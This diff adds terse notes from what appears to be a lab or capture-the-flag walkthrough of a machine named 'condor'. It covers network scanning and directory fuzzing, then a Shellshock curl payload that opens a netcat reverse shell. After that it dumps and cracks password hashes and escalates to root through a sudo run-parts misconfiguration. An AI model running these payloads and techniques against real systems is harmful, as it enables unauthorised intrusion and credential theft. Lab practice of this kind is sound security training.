@@ -1,0 +1,203 @@
+╭─░▒▓    ~/.ssh ·········································································································· INT ✘  took 5s   with root@hy3n4  at 17:06:47  ▓▒░
+╰─ netdiscover -r 192.168.0.1/24
+
+
+╭─░▒▓    ~/.ssh ······················································································································ INT ✘  with root@hy3n4  at 17:07:04  ▓▒░
+╰─ nmap -A -v -p- -T4 192.168.0.22
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-29 17:07 EDT
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 17:07
+Completed NSE at 17:07, 0.00s elapsed
+Initiating NSE at 17:07
+Completed NSE at 17:07, 0.00s elapsed
+Initiating NSE at 17:07
+Completed NSE at 17:07, 0.00s elapsed
+Initiating ARP Ping Scan at 17:07
+Scanning 192.168.0.22 [1 port]
+Completed ARP Ping Scan at 17:07, 0.06s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 17:07
+Completed Parallel DNS resolution of 1 host. at 17:07, 0.04s elapsed
+Initiating SYN Stealth Scan at 17:07
+Scanning 192.168.0.22 [65535 ports]
+Discovered open port 80/tcp on 192.168.0.22
+Discovered open port 22/tcp on 192.168.0.22
+
+
+enumerate port 80
+
+╭─░▒▓    ~/.ssh ·························································································································· ✔  with root@hy3n4  at 17:07:53  ▓▒░
+╰─ ffuf -c -ic -w /usr/share/wordlists/dirb/common.txt -u http://192.168.0.22/FUZZ  
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.0.22/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2ms]
+.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2ms]
+                        [Status: 200, Size: 183, Words: 16, Lines: 1, Duration: 2ms]
+cgi-bin/                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 10ms]
+index.php               [Status: 200, Size: 183, Words: 16, Lines: 1, Duration: 1ms]
+.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 841ms]
+server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
+:: Progress: [4614/4614] :: Job [1/1] :: 19359 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
+
+
+--->   /cgi-bin 
+
+
+╭─░▒▓    ~/.ssh ·············································································································· ✔  took 6s   with root@hy3n4  at 17:08:07  ▓▒░
+╰─ ffuf -c -ic -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.0.22/cgi-bin/FUZZ  -e .py,.rb,.pl,.sh 
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.0.22/cgi-bin/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Extensions       : .py .rb .pl .sh 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+                        [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 7ms]
+condor.sh               [Status: 200, Size: 138, Words: 21, Lines: 8, Duration: 354ms]
+[WARN] Caught keyboard interrupt (Ctrl-C)
+
+
+
+tt shellshock:
+
+╭─░▒▓    /home/hy3n4 ·································································· ✔  with root@hy3n4  at 16:56:58  ▓▒░
+╰─ curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://192.168.0.22/cgi-bin/condor.sh
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+
+╭─░▒▓    /home/hy3n4 ·································································· ✔  with root@hy3n4  at 16:57:14  ▓▒░
+╰─ curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/nc -e /bin/bash 192.168.0.14 6666" http://192.168.0.22/cgi-bin/condor.sh
+
+bingo!
+
+
+
+cd /home/kevin && ls -la
+
+drwxr-xr-x 3 kevin kevin 4096 Nov  6  2021 .
+drwxr-xr-x 4 root  root  4096 Nov  6  2021 ..
+lrwxrwxrwx 1 root  root     9 Nov  6  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 kevin kevin  220 Nov  6  2021 .bash_logout
+-rw-r--r-- 1 kevin kevin 3526 Nov  6  2021 .bashrc
+-rw-r--r-- 1 kevin kevin 4060 Nov  6  2021 .i_did_it_again
+drwxr-xr-x 3 kevin kevin 4096 Nov  6  2021 .local
+-rw-r--r-- 1 kevin kevin  807 Nov  6  2021 .profile
+
+
+interesting file 
+
+
+bash-4.3$ cat .i_did_it_again
+cat .i_did_it_again
+8395d26f20d997f971919e93edee06d3:$6$TCX.c/9ARPR3KCFE$4ZhsWox9dPa8/CG4O6socHVYYM6cJbtpaBx9cefvABC8gP0vMrWsgBhUUGoAHWnJI.X.NyzP5sbtMpGGfwuS11
+307dcfe346e38992d47000630bd19579:$6$gwBgUJgQHGxTex13$b/67Oe7CIvDS85hex4GrHC2RuEkLRfWHAAgimHNyxC/L5biEqSly920uazvDXx3ACrM.srme6Us78aWUEGNAG0
+c34040783efce8ebedb253e854c79569:$6$WAq1h/mdGSMb9QVv$aN54cSdOf3TEsGZt94op0s9hDGWwEusVLi8PtfMmzmOl3AMNGgBMJqQaRHxPrpSFJTLB2T.vFnbYKv6eQpzUT1
+0edc0358ba098a665397f277d9caa307:$6$n5AKhYSQNaywXCs0$k5X7gxoiRh/rfcUVxLHmFlhINTxnsJrqCPRCQYdKmn8UWtn2.yF8J.zqTrx3q8YdnDbdpzZvKNtK4ZqteGDEO.
+dd41cb18c930753cbecf993f828603dc:$6$1tKf9R.0qo7v5DjD$uYneSfO1bb4upW2xlLw.hHGeuAtCunYhdOjQS2MBdnpPcMt0ZiZee42BjDO2jmUJffTXsKdo43SjE4pqM6WqJ/
+7bc4508084ea98e473f8a14c64337165:$6$Qa42LNm.P0lvu65W$PO2NIJrpOnsDsZlyfy7O9Y53oTNQl5/XEsnPFLSF.LTcd3so3ej3owbg4ShTS9NyGkPvNTkjHqpmANbnFpt/p.
+0dfabc0568548c4d5b469da8d8b7ea9e:$6$Sh9.suaUJ4gAq8oc$AtcksaiB6RHzrIoWHEhv5WG.LqgvK5kdr/lsyI6uSfZHLJzqVzGVSfUCAwxf81W/2S.vPtKxXxj3dhfAKb2ZN/
+152286a5a06df48977ebc6aaa9a20c3d:$6$zInc6EuitIEgLloM$LIwMH5u0KuMb.tLNLCJuUrNwp3MEsY3eTsaXDjzjw1ZAPVmq7gztP6kj4I/tE6Z/duopY2GYNpWnsg3IAcppf/
+e3f7967be18c7b7cd78b9290c7d2242e:$6$wx3dQzEanXEJ.2bU$ckH5UVa8EYTXRIzl0YctSHh6SS6CY5x5/FI6VNBF9QKmmcUm4DPebtEzpyTCtmEiNEYNJDusOJ3bRIt2LUe.m/
+d90f6e242720c096a1e60164bed97e38:$6$BuxyuZK8sxui5dEQ$pOBgU/WrKE7BUMFcvbzTvf5C8mdMnZUWbsxgGcc3palSiVfpJv1hcUyrwSouAyOrLUR7RxfK1ZQx5zz8OeZ6O0
+7782ccba760f87fc9d5af29f817704c3:$6$2H8jG9Tm/v/zQU54$60VhLLo53mwVZaSABk9B3kYPoi7GLplYmXiuxh3QbA6375c55BS4Xa26zLuWN/vew4CLDOfh/boAYJtYwe5x30
+1d4a346f0efe20e59ea6f6fab1697ee9:$6$xUzdPAjJFSUELPfm$BiC5VopLNG3R9YCnOl5gISaX1RZh.b6e9mBzHKY37XZpnSQ3N47PqEl1AlopdbVisjdvFTQ2EuEs4PaPQmXr31
+31215562befc5b2b63b9a8c59157160b:$6$79GUQB55tKAqFQ8J$DsZRDjdQhFm6RXvKD2BxW9cqA.igp3DEOVqJMBu5jH1az5WMfefSTuhrjO2MZEmwPC8.GF5ZW38FS.QltjNXm/
+ba72aedf9eb549f71306767c23c65650:$6$qqIjVxgnJUgyu3hB$u9/dZAxreu8vHYsru.2/iH/an5q4l5O.NiCUVXRQftpDqYgF2ctD8ErI91vcqoq0Fx81rHEV6A9VqKeGSCFts1
+cc7b07786718bb12b7719ed4de1b09f8:$6$CsUsq60OD5wwjRM7$F5wSMkVbe9xwpQaSM78U4.FtM75h6nXSDGb0k42k4lIPvMqCJU5Kgk62H2LoumlvT9s5GHNSkRN9J8tx0/Ies1
+91407525d70e34ff20ac05c196845d52:$6$YsRtO5YQI0WOxlap$RSKLi4ASGJT0YlJv1C.ygwLGE3h20OemKdebhShflIxvRRu4MbFTG7VjDN8l5z3rLXtW11SaiuHfyyizS2IkC0
+891b76e89f6fc90399818260ab52288c:$6$mb1uWfgXl9Ewozmx$1FLfMfHxz1woXhlCTMl5fd2Tfk4ZhIUwGk3nyT6.YKGwXXld5Qj2qxb5j7kSgkwyyzSpjmeop4RTrMQB5pbm91
+3c4b18a55c491744752ca8aa67ebb8fa:$6$wS0hYUqtgJT2R.nC$vmNo4bM9677xp.nSR.q5fO9i96NhMLeUjXDh9pDSskns.wPrb..0S6KabXdrWlr22LbiZrrExY.seX5ES6TiU.
+c171902cf93496533e11fbcac976b910:$6$mlBf0ngUOjgblxnH$kkwBa/9RxZBzo/Ql1.5zkkaSHAiHCl1JoeO0ZoFkG7WYf5qJRr/ry8FWp7Mx8D4NC53ydNuEhpvt3GK4u5lmS.
+603baa6aeb73a968acd8c29ac29d2f13:$6$.ilFNmydzCbUSO/S$GDHxKeBdGps/san1VCGyFVdb9AxgTA2q321HrDPBxOSsTR5UeP8BD.0pPB.QjRxCqxrb1hVQQpjh68nyRwYlD0
+f13cfaa1e9b7d291b563fc708cebb5cd:$6$uConkxwx6evw9ozE$zEmuaJXvWhQMMoom44.KTdKNKhmQ9zLnlMSXS9FzHt40rROCWbUpb.6skLCskEcB3WpusyZJKDTswhWy/9.9I/
+2a901979af659161fcf8a5038da3aa56:$6$tHhIyIDwVhNZG9b/$xCiMz91btAWdgRITUfq0ZZKyYv/YQVPSmjH//QqXjdETW43RS1jdm.3fwVTq5oGSP6gBblAlKQIHZIKCo7JaU1
+4fa45207a6148ef8435b273184187595:$6$Vwum/ESnb4UnjHjF$deFOns6PHN7ZxxPM/CeCONWU/VHo7x48ubH09mpCL4igeq986nYuE1/vvbiK8hyN/E1uQpg43QwjR3S3lkOQ//
+9ff824581e97d7e2982d241a68ceb7bc:$6$nH2pmC7pylwvnhbB$IIj1rHB02frfqVHyIWRgULnN9WnQz6xugi1/0iCbbw0jVMU/6Ck9bYiLJzy4tL0893QaD3uDJxZwmG31w9QVt0
+43a9e7f3964fc9e59c783b81a59fe4c9:$6$GIYlWeHsuGf6Gx0Y$9xQWmb1uKj3eAhvaf/h6Ltoo.ef.Vo0G5Mf0/gvoOPV3IjthrcqsYNVNw9L/RCB7Es6Bg9wUrw3tvv/r4tdTF.
+0419a85cf017fe64ee1b0c3835af355f:$6$n/sUIcaxJW3PrDDC$lnNTcvaRqh3bzEIN/z4VdNr7PcAivpaEW1s04MeQ4ywsr..uweC9SbJqPwEKPtYdaAoafh3mUjqALYJTwmc4l0
+5ae4d45e9f3aa3bd8bafa957bfba13a2:$6$eY25fcdC8VEu79/U$Qb6LulcJ/UagtmBUTyDgiggW/MUFl./XXOZjwfwMY5qfTP/nekOc1FrmY2hV2DGXGsEliEYvclZ7Tbs9/eGKQ1
+ee51444fc4db156180ddc8cec199c4de:$6$FiuD8DYrU8YHUBDJ$1a6iKMHxxf3.Dd.8BfdPsW3IDZX7sN8sYwaIFdoGCZyaRD2m9.l73gqSVbgtn3Qyd569jGESkGfZhPyR2a1F4.
+eba85493050731dd33c9efd3ae0fd92e:$6$DO825nF5jlEynyuT$ffsJu3AxoxW5DKkHQF5CBy6ueyYdX1qzq3aWSEu.32YTJCYC9wezaex1P3P0Lkiync94UF3PII8FuMYcTbyuU0
+
+
+cp that file my machine
+
+╭─░▒▓    /home/hy3n4 ····················································································································· ✔  with root@hy3n4  at 17:00:44  ▓▒░
+╰─ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
+Using default input encoding: UTF-8
+Loaded 29 password hashes with 29 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<PASSWORD>     (dd41cb18c930753cbecf993f828603dc)     
+1g 0:00:00:24 0.03% (ETA: 14:50:39) 0.04145g/s 191.0p/s 5444c/s 5444C/s Liverpool..ginuwine
+1g 0:00:01:24 0.07% (ETA: 2022-08-31 01:54) 0.01187g/s 136.8p/s 3995c/s 3995C/s silencio..hawkeye
+Use the "--show" option to display all of the cracked passwords reliably
+Session aborted
+
+
+crack that hash on crackstation
+
+dd41cb18c930753cbecf993f828603dc --> paulo 
+
+su - paulo
+Password:<PASSWORD>
+
+paulo@condor:~$ sudo -l
+Matching Defaults entries for paulo on condor:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User paulo may run the following commands on condor:
+    (ALL : ALL) NOPASSWD: /usr/bin/run-parts
+
+go to gftobins
+
+paulo@condor:~$ sudo run-parts --new-session --regex '^sh$' /bin
+
+
+# id ; uname -a ; hostname
+id ; uname -a ; hostname
+uid=0(root) gid=0(root) groups=0(root)
+Linux condor 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64 GNU/Linux
+condor
+
+
+
+
